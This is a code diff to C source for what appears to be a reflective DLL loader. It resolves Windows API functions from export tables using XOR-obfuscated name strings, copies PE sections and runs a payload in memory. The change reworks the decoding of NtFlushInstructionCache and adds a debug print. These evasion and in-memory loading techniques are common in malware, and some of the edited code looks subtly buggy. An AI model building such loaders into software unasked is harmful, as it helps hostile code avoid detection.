@@ -139,11 +139,11 @@ __declspec(dllexport) LPVOID Dump(void)
     WORD *AddressOfNameOrdinals = (WORD *)(hKernelDLL + ExportDirectory->AddressOfNameOrdinals);
 
     FARPROC(WINAPI * ppGetProcAddress)
-    (HMODULE hModule, LPCSTR lpProcName) = NULL; 
+    (HMODULE hModule, LPCSTR lpProcName) = NULL;
     HMODULE(WINAPI * ppLoadLibraryA)
-    (LPCSTR lpLibFileName) = NULL; 
+    (LPCSTR lpLibFileName) = NULL;
     LPVOID(WINAPI * ppVirtualAlloc)
-    (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = NULL; 
+    (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = NULL;
 
     char ccGetProcAddress[] = {0x77, 0x55, 0x44, 0x60, 0x42, 0x5f, 0x53, 0x71, 0x54, 0x54, 0x42, 0x55, 0x43, 0x43, 0};
     const short ccGetProcAddressLen = 14;
@@ -378,71 +378,6 @@ __declspec(dllexport) LPVOID Dump(void)
     AddressOfNames = (DWORD *)(hNtdllDLL + ExportDirectory->AddressOfNames);
     AddressOfNameOrdinals = (WORD *)(hNtdllDLL + ExportDirectory->AddressOfNameOrdinals);
 
-    LONG(NTAPI * ppNTFlushInstructionCache)
-    (HANDLE hProcess, PVOID pvBaseAddress, ULONG ulNumberOfBytesToFlush) = NULL;
-
-    char ccNTFlushInstructionCache[] = {0x7e, 0x44, 0x76, 0x5c, 0x45, 0x43, 0x58, 0x79, 0x5e, 0x43, 0x44, 0x42, 0x45, 0x53, 0x44, 0x59, 0x5f, 0x5e, 0x73, 0x51, 0x53, 0x58, 0x55, 0};
-    const short ccNTFlushInstructionCacheLen = 23;
-
-    // UnXor NTFlushInstructionCache string
-    j = 0;
-    for (short i = 0; i < ccNTFlushInstructionCacheLen; ++i)
-    {
-        if (j == cckey_len)
-            j = 0;
-
-        BYTE bInput = 0;
-
-        for (BYTE b = 0; b < 8; ++b)
-        {
-            BYTE data_bit_i = _bittest((LONG *)&ccNTFlushInstructionCache[i], b);
-            BYTE key_bit_j = _bittest((LONG *)&cckey[j], b);
-
-            BYTE bit_xor = (data_bit_i != key_bit_j) << b;
-
-            bInput |= bit_xor;
-        }
-
-        ccNTFlushInstructionCache[i] = bInput;
-        ++j;
-    }
-
-    for (DWORD n = 0; n < ExportDirectory->NumberOfNames; ++n)
-    {
-        BOOL bAreEqual = TRUE;
-
-        CHAR *cFuncName = (CHAR *)(hNtdllDLL + AddressOfNames[n]);
-
-        for (short c = 0; c < ccNTFlushInstructionCacheLen; ++c)
-        {
-            if (ccNTFlushInstructionCache[c] != cFuncName[c])
-            {
-                if (ccNTFlushInstructionCache[c] < cFuncName[c])
-                {
-                    if ((ccNTFlushInstructionCache[c] + 32) != cFuncName[c])
-                    {
-                        bAreEqual = FALSE;
-                        break;
-                    }
-                }
-                else if (ccNTFlushInstructionCache[c] > cFuncName[c])
-                {
-                    if (ccNTFlushInstructionCache[c] != (cFuncName[c] + 32))
-                    {
-                        bAreEqual = FALSE;
-                        break;
-                    }
-                }
-            }
-        }
-
-        if (bAreEqual)
-        {
-            ppNTFlushInstructionCache = (FARPROC)(hNtdllDLL + AddressOfFunctions[AddressOfNameOrdinals[n]]);
-            break;
-        }
-    }
-
     // Copy Section headers
     IMAGE_DOS_HEADER *SrcDosHeader = (IMAGE_DOS_HEADER *)ulSrcDLLAddr;
     IMAGE_NT_HEADERS *SrcNTHeaders = (IMAGE_NT_HEADERS *)(ulSrcDLLAddr + SrcDosHeader->e_lfanew);
@@ -562,6 +497,96 @@ __declspec(dllexport) LPVOID Dump(void)
         ++dwImportDescriptorCount;
     }
 
+    // we split the function name xored data into two buffers, since creating a buffer of more than 15 bytes zero out the data,
+    // e.g. creating a buffer of 23 bytes, causes the first 16 bytes being zero.
+    // Following is a workaround
+    char ccNTFlushInstruc[] = {0x7e, 0x44, 0x76, 0x5c, 0x45, 0x43, 0x58, 0x79, 0x5e, 0x43, 0x44, 0x42, 0x45, 0x53};
+    const short ccNTFlushInstrucLen = 14;
+
+    char ccTionCache[] = {0x44, 0x59, 0x5f, 0x5e, 0x73, 0x51, 0x53, 0x58, 0x55, 0};
+    const short ccTionCacheLen = 9;
+
+    const short ccNTFlushInstructionCacheLen = ccNTFlushInstrucLen + ccTionCacheLen;
+
+    LONG(NTAPI * ppNTFlushInstructionCache)
+    (HANDLE hProcess, PVOID pvBaseAddress, ULONG ulNumberOfBytesToFlush) = NULL;
+
+    CHAR *ccNTFlushInstructionCache = (CHAR *)ppVirtualAlloc(NULL, 23, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+
+    if (ccNTFlushInstructionCache == NULL)
+    {
+        return;
+    }
+
+    for (short c = 0; c < ccNTFlushInstrucLen; ++c)
+    {
+        ccNTFlushInstructionCache[c] = ccNTFlushInstruc[c];
+    }
+
+    for (short c = ccNTFlushInstrucLen; c < ccNTFlushInstrucLen + ccTionCacheLen; ++c)
+    {
+        ccNTFlushInstructionCache[c] = ccTionCache[c - ccNTFlushInstrucLen];
+    }
+
+    // UnXor NTFlushInstructionCache string
+    j = 0;
+    for (short i = 0; i < ccNTFlushInstrucLen + ccTionCacheLen; ++i)
+    {
+        if (j == cckey_len)
+            j = 0;
+
+        BYTE bInput = 0;
+
+        for (BYTE b = 0; b < 8; ++b)
+        {
+            BYTE data_bit_i = _bittest((LONG *)&(ccNTFlushInstructionCache)[i], b);
+            BYTE key_bit_j = _bittest((LONG *)&cckey[j], b);
+
+            BYTE bit_xor = (data_bit_i != key_bit_j) << b;
+
+            bInput |= bit_xor;
+        }
+
+        ccNTFlushInstructionCache[i] = bInput;
+        ++j;
+    }
+
+    for (DWORD n = 0; n < ExportDirectory->NumberOfNames; ++n)
+    {
+        BOOL bAreEqual = TRUE;
+
+        CHAR *cFuncName = (CHAR *)(hNtdllDLL + AddressOfNames[n]);
+
+        for (short c = 0; c < ccNTFlushInstructionCacheLen; ++c)
+        {
+            if (ccNTFlushInstructionCache[c] != cFuncName[c])
+            {
+                if (ccNTFlushInstructionCache[c] < cFuncName[c])
+                {
+                    if ((ccNTFlushInstruc[c] + 32) != cFuncName[c])
+                    {
+                        bAreEqual = FALSE;
+                        break;
+                    }
+                }
+                else if (ccNTFlushInstructionCache[c] > cFuncName[c])
+                {
+                    if (ccNTFlushInstructionCache[c] != (cFuncName[c] + 32))
+                    {
+                        bAreEqual = FALSE;
+                        break;
+                    }
+                }
+            }
+        }
+
+        if (bAreEqual)
+        {
+            ppNTFlushInstructionCache = (FARPROC)(hNtdllDLL + AddressOfFunctions[AddressOfNameOrdinals[n]]);
+            break;
+        }
+    }
+
     // Flush the instruction cache
     ppNTFlushInstructionCache((HANDLE)-1, NULL, 0);
 
@@ -577,6 +602,7 @@ __declspec(dllexport) LPVOID Dump(void)
 
 void Go(void)
 {
+    printf("Hello Go\n");
     LPVOID lpvPayload = NULL;
 
     HMODULE hKernelDLL = MyGetKernelModuleHandle();
